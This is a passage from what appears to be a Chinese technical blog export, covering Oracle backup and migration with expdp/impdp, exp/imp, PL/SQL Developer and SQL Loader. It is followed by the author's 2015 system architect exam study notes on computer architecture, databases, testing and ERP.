punctuation">,</span>dept <span class="token keyword">dumpfile</span><span class="token operator">=</span>expdp<span class="token punctuation">.</span>dmp DIRECTORY<span class="token operator">=</span>dpdata1<span class="token punctuation">;</span>impdp scott<span class="token operator">/</span>tiger<span class="token variable">@orcl</span> <span class="token keyword">TABLES</span><span class="token operator">=</span>emp<span class="token punctuation">,</span>dept <span class="token keyword">dumpfile</span><span class="token operator">=</span>expdp<span class="token punctuation">.</span>dmp DIRECTORY<span class="token operator">=</span>dpdata1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 按查询条件备份 */</span>expdp scott<span class="token operator">/</span>tiger<span class="token variable">@orcl</span> directory<span class="token operator">=</span>dpdata1 <span class="token keyword">dumpfile</span><span class="token operator">=</span>expdp<span class="token punctuation">.</span>dmp <span class="token keyword">Tables</span><span class="token operator">=</span>emp query<span class="token operator">=</span><span class="token string">'WHERE deptno=20'</span><span class="token punctuation">;</span>impdp scott<span class="token operator">/</span>tiger<span class="token variable">@orcl</span> directory<span class="token operator">=</span>dpdata1 <span class="token keyword">dumpfile</span><span class="token operator">=</span>expdp<span class="token punctuation">.</span>dmp <span class="token keyword">Tables</span><span class="token operator">=</span>emp<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5-8-2-imp与exp"><a href="#5-8-2-imp与exp" class="headerlink" title="5.8.2. imp与exp"></a>5.8.2. imp与exp</h4><p>imp与exp工具是在命令行环境中使用的（如Linux的终端、Windows的Dos），它需要Oracle客户端的支持。imp与exp除了支持在服务器本地执行数据迁移，也支持远程操作。</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 全库备份 */</span>exp system<span class="token operator">/</span>pafirc<span class="token variable">@192.168.11.22</span><span class="token operator">/</span>orcl <span class="token keyword">FILE</span><span class="token operator">=</span><span class="token string">'e:\ pafirc.dmp'</span> <span class="token keyword">FULL</span><span class="token operator">=</span>yimp system<span class="token operator">/</span>pafirc<span class="token variable">@192.168.11.22</span><span class="token operator">/</span>orcl <span class="token keyword">FILE</span><span class="token operator">=</span><span class="token string">'e:\ pafirc.dmp'</span> <span class="token keyword">FULL</span><span class="token operator">=</span>y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 按表空间备份 */</span>exp scott<span class="token operator">/</span>tiger<span class="token variable">@192.168.11.22</span><span class="token operator">/</span>orcl <span class="token keyword">FILE</span><span class="token operator">=</span><span class="token string">'d:\full_tablespace.dmp'</span> <span class="token keyword">FULL</span><span class="token operator">=</span>yimp scott<span class="token operator">/</span>tiger<span class="token variable">@192.168.11.22</span><span class="token operator">/</span>orcl <span class="token keyword">FILE</span><span class="token operator">=</span><span class="token string">'d:\full_tablespace.dmp'</span> <span class="token keyword">FULL</span><span class="token operator">=</span>y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 按表名备份 */</span>exp scott<span class="token operator">/</span>tiger<span class="token variable">@192.168.11.22</span><span class="token operator">/</span>orcl <span class="token keyword">FILE</span><span class="token operator">=</span><span class="token string">'d:\person.dmp'</span> <span class="token keyword">TABLES</span><span class="token operator">=</span><span class="token punctuation">(</span>PERSON<span class="token punctuation">)</span>imp scott<span class="token operator">/</span>tiger<span class="token variable">@192.168.11.22</span><span class="token operator">/</span>orcl <span class="token keyword">FILE</span><span class="token operator">=</span><span class="token string">'d:\person.dmp'</span> <span class="token keyword">TABLES</span><span class="token operator">=</span><span class="token punctuation">(</span>PERSON<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 按查询条件备份 */</span>exp scott<span class="token operator">/</span>tiger<span class="token variable">@192.168.11.22</span><span class="token operator">/</span>orcl <span class="token keyword">FILE</span><span class="token operator">=</span><span class="token string">'d:\person_part.dmp'</span> <span class="token keyword">TABLES</span><span class="token operator">=</span><span class="token punctuation">(</span>PERSON<span class="token punctuation">)</span> QUERY<span class="token operator">=</span><span class="token string">"WHERE ID=3"</span>imp scott<span class="token operator">/</span>tiger<span class="token variable">@192.168.11.22</span><span class="token operator">/</span>orcl <span class="token keyword">FILE</span><span class="token operator">=</span><span class="token string">'d:\person_part.dmp'</span> <span class="token keyword">TABLES</span><span class="token operator">=</span><span class="token punctuation">(</span>PERSON<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意：imp命令默认是导入表结构和数据的，若只需导入数据，则需增加参数“data_only=y” 。</p></blockquote><h4 id="5-8-3-PL-SQL"><a href="#5-8-3-PL-SQL" class="headerlink" title="5.8.3. PL/SQL"></a>5.8.3. PL/SQL</h4><p>PL/SQL是Oracle专用的客户端工具，常用于Windows环境。使用它可以很方便地进行数据迁移。不过它需要在本地安装Oracle客户端作为支持。</p><p>使用PL/SQL进行数据迁移的步骤如下：</p><p><strong>（1）配置远程数据库连接信息</strong>：</p><p>修改“%本地oracle客户端根目录%\NETWORK\ADMIN”目录下的配置文件TNSNAMES.ORA，增加监听服务名称。在其末尾添加远程服务器信息：</p><pre><code>ORCL192_168_11_22 = (DESCRIPTION =         (ADDRESS = (PROTOCOL = TCP)                     (HOST = 192.168.11.22)                     (PORT = 1521)        )        (CONNECT_DATA = (SERVER = )                           (SERVICE_NAME = orcl)        )    )</code></pre><p>其中ORCL192_168_11_22为监听服务名称，可任意命名。HOST为远程服务器的IP地址，PROT为远程Oracle服务器的服务端口，SERVICE_NAME为远程Oracle服务器的实例名称。</p><p><strong>（2）运行PL/SQL登录远程Oracle服务器</strong>：</p><p>如下图所示，选择数据库名称为ORCL192_168_11_22，帐密根据实际，连接角色Normal。</p><p><img src="./04.png"></p><p><strong>（3）备份操作</strong>：</p><p>依次操作Tool -&gt; Export Tables -&gt; PL/SQL develope，出现如下图所示的界面。选中要导出的表（不选则默认为选择全部），然后填写导出位置，最后执行Export即导出数据到本地。</p><p><img src="./05.png"></p><p>注意这里不使用Oracle Export和SQL Inserts方式导出。</p><p>Oracle Export导出需要驱动器，只能在服务器本地执行，不适用于远程备份恢复。SQL Inserts虽然可以导出，但导入需要驱动器，即可以远程备份，但要在本地恢复。</p><p><strong>（4）恢复</strong>：</p><p>依次操作Tool -&gt; Import Tables -&gt; PL/SQL developer，出现如所示的界面。选中要导入的表（不选则默认为选择全部），然后选择备份文件，最后执行Import即把本地数据导入到远程数据库。</p><p><img src="./06.png"></p><p>注意的是，若勾选“Drop tables”，则要求所有导入的表，在数据库中都有同名表。若不勾选“Drop tables”，则要求所有导入的表，在数据库中都没有同名表。否则导入会失败。</p><h4 id="5-8-4-SQL-Loader"><a href="#5-8-4-SQL-Loader" class="headerlink" title="5.8.4. SQL Loader"></a>5.8.4. SQL Loader</h4><p>SQL Loader是Oracle的数据加载工具，常用于Linux环境。通常用来将操作系统文件迁移到Oracle数据库中。它大型数据仓库选择使用的加载方法，因为它提供了最快速的途径（DIRECT串行，或PARALLEL并行）加载数据。</p><p>现在抛开其理论不谈，用实例来使介绍SQL Loader的使用方法：</p><p>在命令行下执行以下SQL Loader命令（在Linux下，SQL Loader的命令一般为sqlldr/sqlload，在Windows下则一般为SQLLDR）：</p><pre class="line-numbers language-bash"><code class="language-bash">sqlldr userid<span class="token operator">=</span>hr/hr control<span class="token operator">=</span>/u01/app/sl1.ctl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中 <code>sl1.ctl</code> 为SQL Loader的控制文件，其示例内容如下所示：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">LOAD</span> <span class="token keyword">DATA</span><span class="token keyword">infile</span> <span class="token string">'/u01/app/sl1.dat'</span>            <span class="token comment" spellcheck="true">/* 真正要加载的源数据文件 */</span>badfile <span class="token string">'/u01/app/bad.log'</span>        <span class="token comment" spellcheck="true">/* 记录错误的文件 */</span>APPEND <span class="token keyword">INTO</span> <span class="token keyword">TABLE</span> sl1        <span class="token comment" spellcheck="true">/* 以追加的方式插入数据到表sl1，若无“APPEND”，则采用默认的INSERT插入方式 */</span><span class="token keyword">fields</span> <span class="token keyword">TERMINATED BY</span> <span class="token string">','</span>        <span class="token comment" spellcheck="true">/* 以逗号分隔每列的数据 */</span><span class="token keyword">optionally</span> <span class="token keyword">enclosed by</span> <span class="token string">'"'</span>        <span class="token comment" spellcheck="true">/* 表示列值以双引号作为标识进行封闭 */</span>TRAILING NULLCOLS            <span class="token comment" spellcheck="true">/* 将所有不在纪录中的指定位置的列当作空值 */</span><span class="token comment" spellcheck="true">/* 最后6行则为表sl1每列的属性，其中声明为EXTERNAL的表示该列为外键 */</span><span class="token punctuation">(</span> col1 CHAR<span class="token punctuation">,</span> col2 CHAR<span class="token punctuation">,</span> col3 <span class="token keyword">INTEGER</span> EXTERNAL<span class="token punctuation">,</span> col4 <span class="token keyword">INTEGER</span> EXTERNAL<span class="token punctuation">,</span> col5 <span class="token keyword">INTEGER</span> EXTERNAL<span class="token punctuation">,</span> col6 CHAR<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="6-数据库的日常开发要求"><a href="#6-数据库的日常开发要求" class="headerlink" title="6. 数据库的日常开发要求"></a>6. 数据库的日常开发要求</h1><ul><li>关注主键。尽量都有主键，除非一些流水表。</li><li>关注索引。索引不是越多越好，并不是所有的查询都是适合索引。</li><li>关注分区。分区上也要关注全局索引和分区索引。</li><li>关注批量。批量修改时使用文件加载，不要逐条处理。一般只要1小时的数据量超过1000条，就要使用文件加载。</li><li>关注多表关联。不是所有的关联结果都一样。</li><li>每个项目一定要设置一位固定的虚拟角色来管模型。不要人人都可以加表、改表，必须进行控制，不能每人都是建模者。</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Oracle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2015 系统架构师复习资料</title>
      <link href="/articles/arch/2015-xi-tong-jia-gou-shi-fu-xi-zi-liao/"/>
      <url>/articles/arch/2015-xi-tong-jia-gou-shi-fu-xi-zi-liao/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>经过一年的复习，鄙人终于通过了15年的 【<strong>系统架构师</strong>】 资格考试啦 O(∩_∩)O</p><p>为了更多人都可以通过，分享一下我自己整理的复习要点~</p><p>不过<strong>现在 架构师 的考点还不稳定，大家在复习的时候也要善于自己总结哦</strong>！</p><p>我整理复习资料分为【上午题】【下午题】【论文】三部分，</p><p>结合了07<del>14年的真题，去除了重复题型整编的</del></p><ul><li>【<font color="red">上午题</font>（<a href="#%E4%B8%8A%E5%8D%88%E9%A2%98">Go</a>）】以理解为主，当然如果有能力背下来是最好的</li><li>【<font color="red">下午题</font>（<a href="#%E4%B8%8B%E5%8D%88%E9%A2%98">Go</a>）】以背为主，当然最理想是都实践过这些知识点，理解了才更好背</li><li>【<font color="red">论文题</font>（<a href="#%E8%AE%BA%E6%96%87%E9%A2%98">Go</a>）】我只有给提纲，这个必须多练~ 除了练题型，也要练字迹、练手速</li></ul><p>因为下午题（2.5H）完了之后，休息15min就要写论文，论文只有2H，想合格3000字是必须的~</p><p>换言之你需要连续写字写4.5H，不想手腐就写写写写吧。。。 至少一星期一篇，，，</p><p>顺便吐槽一下15年的考试~~</p><p>上午题偏僻~ 下午题偏易~ 论文题有架构风格肯定大众必选的45分保底题型~</p><ul><li><a href="http://download.csdn.net/download/lyy289065406/9412141">复习资料下载</a></li><li><a href="https://share.weiyun.com/55IE92a">官方教材《系统架构设计师教程》下载（密码：ndkiyi）</a></li></ul><p><img src="./01.png"></p><p><img src="./02.png"></p><p><img src="./03.png"></p><blockquote><p>本文标题后若标注了【P<font color="red">xx</font>】字样，表示在《系统架构设计师教程》的第 <font color="red">xx</font> 页有相关内容</p></blockquote><hr><h2 id="上午题"><a href="#上午题" class="headerlink" title="上午题"></a>上午题</h2><h3 id="版本号规范"><a href="#版本号规范" class="headerlink" title="版本号规范"></a>版本号规范</h3><ul><li>处于“草稿”状态的版本号都是以“0.”格式开头</li><li>处于“正式”状态的版本号格式为“X.Y”（X为主版本号，取值1<del>9，Y为次版本号，取值0</del>9）</li><li>处于“修改”状态的版本号格式为“X.YZ”</li></ul><h3 id="CISC（复杂-指令集计算机）和RISC（精简指令集计算机）"><a href="#CISC（复杂-指令集计算机）和RISC（精简指令集计算机）" class="headerlink" title="CISC（复杂 指令集计算机）和RISC（精简指令集计算机）"></a>CISC（复杂 指令集计算机）和RISC（精简指令集计算机）</h3><table><thead><tr><th align="left">比较内容</th><th align="left">CISC</th><th align="left">RISC</th></tr></thead><tbody><tr><td align="left">指令系统</td><td align="left">复杂，庞大</td><td align="left">简单，精简</td></tr><tr><td align="left">指令数目</td><td align="left">一般 &gt; 200</td><td align="left">一般 &lt; 100</td></tr><tr><td align="left">指令格式</td><td align="left">一般 &gt; 4种</td><td align="left">一般 &lt; 4种</td></tr><tr><td align="left">寻址方式</td><td align="left">一般 &gt; 4种</td><td align="left">一般 &lt; 4种（简单寻址）</td></tr><tr><td align="left">指令字长</td><td align="left">不固定，1~15字节</td><td align="left">等长，通常为4字节</td></tr><tr><td align="left">可访存指令</td><td align="left">不加限制</td><td align="left">只有LOAD / STORE等指令</td></tr><tr><td align="left">各种指令使用频率</td><td align="left">相差很大</td><td align="left">相差不大</td></tr><tr><td align="left">优化编译实现</td><td align="left">很难</td><td align="left">较容易</td></tr><tr><td align="left">程序源代码长度</td><td align="left">较短</td><td align="left">较长</td></tr><tr><td align="left">控制器实现方式</td><td align="left">绝大多数为微程序控制</td><td align="left">绝大多数为硬布线控制</td></tr><tr><td align="left">芯片设计复杂度</td><td align="left">高</td><td align="left">低</td></tr><tr><td align="left">软件系统开发时间</td><td align="left">较短</td><td align="left">较长</td></tr><tr><td align="left">操作</td><td align="left">可以对存储器和寄存器进行算术和逻辑操作</td><td align="left">设置大量通用寄存器，访问存储器指令简单，<br>只能对寄存器进行算术和逻辑操作</td></tr><tr><td align="left">执行时间</td><td align="left">有些指令执行时间很长</td><td align="left">选取使用频率较高的一些简单指令，<br>且指令执行时间较短</td></tr></tbody></table><h3 id="并发任务的同步互斥"><a href="#并发任务的同步互斥" class="headerlink" title="并发任务的同步互斥"></a>并发任务的同步互斥</h3><ul><li>同步：进程间的直接制约关系，如生产者消费者问题</li><li>互斥：进程间的间接制约关系，如临界资源的PV操作</li></ul><h3 id="PV原语"><a href="#PV原语" class="headerlink" title="PV原语"></a>PV原语</h3><ul><li><strong>P原语</strong>：Proberen（测试），为阻塞原语，负责把当前进程由运行态转为阻塞态，等待唤醒。<br>   　　　　　其操作为：申请一个空闲资源（信号量-1），成功退出，失败阻塞。</li><li><strong>V原语</strong>：Verhogen（增加），为唤醒原语，负责唤醒一个阻塞进程。<br>　　　　　其操作为：释放一个被占用的资源（信号量+1）。</li></ul><h3 id="看门狗（Watch-Dog）"><a href="#看门狗（Watch-Dog）" class="headerlink" title="看门狗（Watch Dog）"></a>看门狗（Watch Dog）</h3><p>WDT（Watch Dog Timer）是一个定时电路，一般有一个输入，叫“喂狗”，一个输出到MCU（微控制单元）的RTS端（标志位，表示复位连接）。</p><p>MCU正常工作时，每隔一段时间输出一个信号到喂狗端清零，若超时不喂狗，WDT定时器超时，就会给出复位信号（复位中断）到MCU，使MCU复位，防止死机。</p><p>WDT的作用就是防止程序死循环或跑飞（系统受到干扰后偏离正常运行的路径）。</p><h3 id="高速缓存"><a href="#高速缓存" class="headerlink" title="高速缓存"></a>高速缓存</h3><p>高速缓存介于CPU与主存（内存）之间，利用局部性原理消减CPU与主存之间的速度差以提升系统性能。其工作速度数倍于主存，全部功能由硬件实现，且<strong>对程序员透明</strong>。</p><h3 id="存储管理方案"><a href="#存储管理方案" class="headerlink" title="存储管理方案"></a>存储管理方案</h3><ul><li><strong>覆盖</strong>：编程时必须划分程序模块和确定程序模块之间的调用关系，不存在调用关系的模块可以占用相同的主存区。</li><li><strong>固定分区</strong>：在系统进行初始化的时候就已经将主存空间划分成大小相等或不等的块，并且这些块的大小在此后是不可以改变的。系统将程序分配在连续的区域中。</li><li><strong>请求分页</strong>：主存空间和程序按固定大小单位进行分割，程序可以分配在不连续的区域中。该方案当一个作业的程序地址空间大于主存可以使用的空间时也可以执行。</li></ul><h3 id="数据库范式（P25）"><a href="#数据库范式（P25）" class="headerlink" title="数据库范式（P25）"></a>数据库范式（P25）</h3><ul><li><strong>1NF</strong>：原子式。</li><li><strong>2NF</strong>：所有字段都必须与主键有直接或间接相关，允许某些字段与候选码传递或非传递依赖。</li><li><strong>3NF</strong>：所有字段都必须与主键直接相关，允许某些字段与候选码传递或非传递依赖。</li><li><strong>BCNF</strong>：所有字段都必须与主键直接相关，不允许存在字段与候选码有传递或非传递依赖。</li></ul><h3 id="数据库设计步骤（P27）"><a href="#数据库设计步骤（P27）" class="headerlink" title="数据库设计步骤（P27）"></a>数据库设计步骤（P27）</h3><ul><li><strong>需求分析</strong>：DFD</li><li><strong>概念结构设计</strong>：E-R图</li><li><strong>逻辑结构设计</strong>：确定数据模型（由E-R图转换）、约束</li><li><strong>物理结构设计</strong>：利用DBMS设计数据库</li><li><strong>应用程序设计</strong>：对DBMS的二次开发，存储用户信息，实现用户处理要求</li><li><strong>运行维护</strong>：数据的转储和恢复、安全性和完整性控制、性能监督、数据库重组等</li></ul><h3 id="关系模式分解"><a href="#关系模式分解" class="headerlink" title="* 关系模式分解"></a>* 关系模式分解</h3><p><strong>无损分解算法</strong>：LOSSLESSTEST(R, F ,p) 算法。</p><p><strong>定理</strong>：</p><ul><li>关系模式R(U)，分解为 p={R(U1),R(U2)}</li><li>p是无损连接的，当且仅当</li><li>U1∩U2 → U1-U2 或 U1∩U2 → U2-U1</li></ul><p><strong>分解保持依赖</strong> - 最小依赖集：</p><ul><li>① 将F中的所有依赖右边化为单一元素</li><li>② 去掉F中的所有依赖左边的冗余属性</li><li>③ 去掉F中所有冗余依赖关系</li></ul><h3 id="实体关系向关系模型的转换规则"><a href="#实体关系向关系模型的转换规则" class="headerlink" title="实体关系向关系模型的转换规则"></a>实体关系向关系模型的转换规则</h3><ul><li>多对多的联系 <strong>[必须]</strong> 转换成一个独立的关系模式</li><li>一对多的联系既可以转换成一个独立的关系模式，也可以与多端关系模式合并（此时需把一端的码合并到多端关系模式中）</li></ul><h3 id="数据库的数据集成"><a href="#数据库的数据集成" class="headerlink" title="数据库的数据集成"></a>数据库的数据集成</h3><ul><li>若单表即可完成整合，则可以将该表封装为记录，采用 <strong>[主动记录]</strong> 方式进行集成</li><li>若需要多表进行数据整合，则需要采用 <strong>[数据映射]</strong> 方式完成数据集成与处理</li></ul><h3 id="商业智能的主要技术（P30）"><a href="#商业智能的主要技术（P30）" class="headerlink" title="商业智能的主要技术（P30）"></a>商业智能的主要技术（P30）</h3><p>数据仓库、联机分析、数据挖掘</p><h3 id="数据挖掘（P32）"><a href="#数据挖掘（P32）" class="headerlink" title="数据挖掘（P32）"></a>数据挖掘（P32）</h3><ul><li><strong>目标</strong>：从数据库的大量数据中揭示出隐含的、先前未知的并有潜在价值的信息。</li><li><strong>挖掘信息特征</strong>：先知、有效、实用。</li><li><strong>主要功能（任务）</strong>：自动预测趋势和行为、关联分析、聚类、概念描述、偏差检测。</li><li><strong>挖掘技术</strong>：关联分析、序列分析、分类分析、聚类分析、预测、时间序列分析。</li><li><strong>挖掘流程</strong>：确定挖掘对象、准备数据、建立模型、数据挖掘、结果分析、知识应用。</li></ul><h3 id="多媒体技术标准（P42）"><a href="#多媒体技术标准（P42）" class="headerlink" title="多媒体技术标准（P42）"></a>多媒体技术标准（P42）</h3><ul><li>静态图像压缩编码标准：JPEG</li><li>运动图像压缩标准：MPEG</li><li>MPEG-1：应用于VCD、CD、MP3</li><li>MPEG-2：应用于DVD、HDTV</li><li>MPEG-4：面向低速、低码率的传输条件（如移动网）</li></ul><p>另外，MPEG-7是多媒体接口标准，MPEG-21是多媒体框架标准</p><h3 id="视频压缩技术"><a href="#视频压缩技术" class="headerlink" title="视频压缩技术"></a>视频压缩技术</h3><p>视频图像本身在时间和空间上都存在冗余信息。</p><p>视频图像压缩技术的基本思想和方法可归纳为：</p><ul><li>在空间上，图像数据压缩采用JPEG压缩方法去除冗余信息，主要包括 <strong>[帧内预测]</strong> 和 <strong>[变换编码]</strong></li><li>在时间上，图像数据采用 <strong>[帧间预测编码]</strong> 和 <strong>[运动补偿]</strong> 去除冗余信息。</li></ul><p>视频压缩中包括 <strong>[有损压缩]</strong> 和 <strong>[无损压缩]</strong> 两种：</p><ul><li>无损压缩： <strong>[哈夫曼编码]**、 **[行程编码]</strong></li><li>有损压缩： <strong>[预测编码]**、 **[变换编码]**、 **[运动补偿]</strong></li></ul><h3 id="结构化布线系统"><a href="#结构化布线系统" class="headerlink" title="结构化布线系统"></a>结构化布线系统</h3><ul><li>工作区子系统（如PC到房间路由）<br>　　由终端设备到信息插座的整个区域，用于将终端设备连接到布线系统。</li><li>水平子系统（如房间内多个PC间的拓扑支线）<br>　　连接用户工作区与布线系统主干的子系统，起支线作用，将所有用户通过连接件连接到配线设备上。</li><li>管理子系统（如房间路由到楼层交换机）<br>　　对布线电缆进行端接及配线管理的子系统，由各种交换设备（如集线器、交换机等）组成。</li><li>干线子系统 / 垂直子系统（如各楼层交换机之间的连接干线）<br>　　连接各管理间、设备间的子系统。</li><li>设备间子系统（如大楼网箱）<br>　　主要用于安放网络关键设备（如程控交换机等），地位重要，但不一定有，大型建筑一般有多个。</li><li>建筑群子系统（如大楼间的光纤电缆、无线网等）<br>　　连接楼群间通信传输介质及各种支持设备组成的子系统，传输介质可以是有线或无线。</li></ul><h3 id="性能评估指标（P47）"><a href="#性能评估指标（P47）" class="headerlink" title="性能评估指标（P47）"></a>性能评估指标（P47）</h3><ul><li><strong>计算机</strong>：时钟频率（主频）、运算速度、运算精度、内存容量、存取周期等等</li><li><strong>路由器</strong>：设备吞吐量、端口吞吐量、丢包率、时延、时延抖动等等</li><li><strong>交换机</strong>：背板吞吐量、换成区大小、最大MAC地址表大小、负载均衡等等</li><li><strong>网络</strong>：设备级性能指标、网络级性能指标、应用级性能指标、用户级性能指标、吞吐量</li><li><strong>操作系统</strong>：可靠性、吞吐量（率）、系统响应时间、系统资源利用率、可移植性</li><li><strong>数据库管理系统</strong>：数据库大小、表数量、单表大小、单表允许最大行/列/索引数量等等</li><li><strong>Web服务器</strong>：最大并发连接数、响应延迟、吞吐量</li></ul><h3 id="系统测试"><a href="#系统测试" class="headerlink" title="系统测试"></a>系统测试</h3><p>系统测试是将已经确认的软件、计算机硬件、外设和网络等其他因素结合在一起，进行信息系统的各种集成测试和确认测试。</p><p>系统测试根据系统方案说明书来设计测试用例，常见的测试内容包括恢复测试、安全性测试、压力测试、性能测试、可靠性测试、可用性测试、可维护性测试和安装测试。</p><h3 id="冒烟测试"><a href="#冒烟测试" class="headerlink" title="冒烟测试"></a>冒烟测试</h3><p>将代码更改嵌入到产品的源代码之前，对这些更改进行验证的过程。</p><p>采用极限编程（XP）的“持续集成”策略有助于建立冒烟测试的环境。</p><h3 id="集成测试"><a href="#集成测试" class="headerlink" title="集成测试"></a>集成测试</h3><table><thead><tr><th align="left">-</th><th align="left">非增量式测试</th><th align="left">增量式测试</th></tr></thead><tbody><tr><td align="left">错误定位</td><td align="left">不容易定位错误</td><td align="left">容易定位错误、排除故障</td></tr><tr><td align="left">测试强度</td><td align="left">小</td><td align="left">大，先加入的模块经过多次测试，测试更彻底</td></tr><tr><td align="left">测试工作量</td><td align="left">小</td><td align="left">大</td></tr><tr><td align="left">测试进度</td><td align="left">对各个模块可以并行测试，加快测试进度</td><td align="left">测试过程长、进度慢</td></tr><tr><td align="left">测试辅助程序</td><td align="left">每个中间模块的测试都需要编写驱动模块和桩模块</td><td align="left">自顶向下的增加需要编写桩模块<br>自底向上的增加需要编写驱动模块</td></tr></tbody></table><h3 id="软件测试与软件调试区别"><a href="#软件测试与软件调试区别" class="headerlink" title="软件测试与软件调试区别"></a>软件测试与软件调试区别</h3><ul><li>测试是为了发现软件中存在的错误。调试是为了证明软件开发的正确性。</li><li>测试以已知条件开始，使用预先定义的程序，且有预知的结果，不可预见的仅是程序是否通过测试。调试以一段不可知的内部条件开始，除统计性调试外，结果是不可预见的。</li><li>测试是有计划的、需要进行测试设计。调试是不受时间约束的。</li><li>测试经历发现错误、改正错误、重新测试的过程。调试是一个推理的过程。</li><li>测试经常是独立的测试组在不了解软件设计的条件下完成的。调试必须由了解详细设计的开发人员完成。</li><li>大多数测试的执行和设计可由工具支持。调试时，开发人员能利用的工具主要是调试器。</li></ul><h3 id="单元测试-桩模块"><a href="#单元测试-桩模块" class="headerlink" title="单元测试-桩模块"></a>单元测试-桩模块</h3><p>桩模块是指 模拟 <strong>[被测试模块]</strong> <strong>[所调用的模块]</strong> ，而不是软件产品的组成部分。</p><p>主模块作为驱动模块，在单元测试时，与之直接相连的模块可用 桩模块 代替。</p><h3 id="测试分类"><a href="#测试分类" class="headerlink" title="测试分类"></a>测试分类</h3><ul><li>负载测试：运行某些诊断程序，加大负载，检查哪个设备会发生故障。</li><li>集成测试：验证程序模块之间的接口是否正常起作用</li><li>白盒测试：根据程序的内部结构和内部逻辑，测试程序是否正确</li><li>基准测试：运行一个标准程序对多种计算机系统进行检查，以比较和评价它们的性能</li></ul><h3 id="基准测试程序（P49）"><a href="#基准测试程序（P49）" class="headerlink" title="基准测试程序（P49）"></a>基准测试程序（P49）</h3><p>把应用程序中用得最多、最频繁的那部分 <strong>[核心程序]</strong> 作为评价计算机性能的标准程序，称为基准测试程序，一般使用公认的第三方测试。</p><h3 id="四种评价程序的准确度（P49）"><a href="#四种评价程序的准确度（P49）" class="headerlink" title="四种评价程序的准确度（P49）"></a>四种评价程序的准确度（P49）</h3><p>依靠评价程序评价机器的性能，按评测准确度由高至低的4种评价程序为：</p><p>真实的程序  &gt;  核心程序  &gt;  小型基准程序  &gt;  合成基准程序</p><h3 id="软件设计和软件测试"><a href="#软件设计和软件测试" class="headerlink" title="软件设计和软件测试"></a>软件设计和软件测试</h3><p>软件设计应从“宏观”的软件架构开始，“微观”的构件模块结束。</p><p>软件测试则相反，应从“微观”开始，“宏观”结束。</p><h3 id="与电子政务相关的行为主体（P59）"><a href="#与电子政务相关的行为主体（P59）" class="headerlink" title="与电子政务相关的行为主体（P59）"></a>与电子政务相关的行为主体（P59）</h3><p>政府、企业/事业单位、公民/居民</p><h3 id="企业信息化目的（P62）"><a href="#企业信息化目的（P62）" class="headerlink" title="企业信息化目的（P62）"></a>企业信息化目的（P62）</h3><ul><li>技术创新</li><li>管理创新：按照市场发展的要求，对企业现有的管理流程重新整合，<br>　　　　　　从作为管理核心的财务、资金管理，<strong>转向</strong>技术、物资、人力资源的管理，<br>　　　　　　并<strong>延伸</strong>到企业技术创新、工艺设计、产品设计、生产制造过程的管理，<br>　　　　　　进而还要<strong>扩展</strong>到客户关系管理、供应链的管理乃至发展到电子商务。</li><li>制度创新</li></ul><h3 id="ERP（企业资源计划）结构（P66）"><a href="#ERP（企业资源计划）结构（P66）" class="headerlink" title="ERP（企业资源计划）结构（P66）"></a>ERP（企业资源计划）结构（P66）</h3><ul><li><strong>（1）生产预测</strong>：对市场需求进行预测，其结果用于计划。</li><li><strong>（2）销售管理计划</strong>：对销售部门的相关业务进行管理，属于决策层（最高层）计划。</li><li><strong>（3）经营计划（生产计划大纲）</strong><br>　根据经营计划的生产目标制定，是对企业经营计划的细化，用于描述企业在可用资源的条件下，在一定时期中的产量计划。</li><li><strong>（4）主生产计划</strong><br>　其编制是ERP的主要工作内容，是对企业生产计划大纲的细化，说明在一定时期内生产什么、生产多少和什么时候交货。</li><li><strong>（5）物料需求计划</strong><br>　是对主生产计划的各个项目所需的全部制造件和全部采购件的网络支持计划和时间进度计划，属于ERP管理层计划。</li><li><strong>（6）能力需求计划</strong><br>　是对物料需求计划所需能力进行核算的一种计划管理方法，能够帮助企业今早发现生产能力的瓶颈、为实现企业的生产任务而提供能力方面的保障。</li><li><strong>（7）车间作业计划</strong><br>　按照交货期的前后和生产优先级选择原则、以及车间的生产资源情况，将生产计划以订单形式下达给适当的车间，属于ERP执行层计划。</li><li><strong>（8）采购与库存管理</strong><br>　采购管理：对订单产生至货物收到的全过程进行组织、实施和控制。<br>　库存管理：对企业物料的进、出、存进行管理。</li><li><strong>（9）质量与设备管理</strong><br>　质量管理：贯穿企业管理的始终。<br>　